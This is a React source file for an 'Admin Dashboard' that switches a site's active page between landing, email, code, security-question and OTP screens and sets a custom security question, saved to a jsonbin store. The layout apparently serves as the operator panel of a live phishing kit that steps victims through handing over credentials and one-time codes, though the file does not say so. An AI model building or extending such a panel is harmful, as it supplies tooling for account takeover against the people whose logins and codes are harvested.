import { useState } from "react";
import { updateSettings } from "../pages/jsonbin";

export default function Admin() {

    const [activePage, setActivePage] = useState("landing");

    const [question, setQuestion] = useState("");

    const save = async () => {

        await updateSettings({

            activePage: activePage as any,

            securityQuestion: question

        });

        alert("Updated Successfully");

    };

    return (

        <div className="max-w-2xl mx-auto mt-20">

            <h1 className="text-4xl font-bold mb-10">

                Admin Dashboard

            </h1>

            <label>

                Active Page

            </label>

            <select

                className="border w-full p-4 mt-2"

                value={activePage}

                onChange={(e) => setActivePage(e.target.value)}

            >

                <option value="landing">

                    Landing

                </option>

                <option value="email">

                    Email

                </option>

                <option value="code">

                    Code

                </option>

                <option value="security">

                    Security Question

                </option>

                <option value="otp">

                    OTP

                </option>

            </select>

            <label className="block mt-8">

                Security Question

            </label>

            <input

                className="border w-full p-4 mt-2"

                value={question}

                onChange={(e) => setQuestion(e.target.value)}

            />

            <button

                onClick={save}

                className="mt-8 bg-black text-white px-8 py-4 rounded"

            >

                Save Changes

            </button>

        </div>

    );

}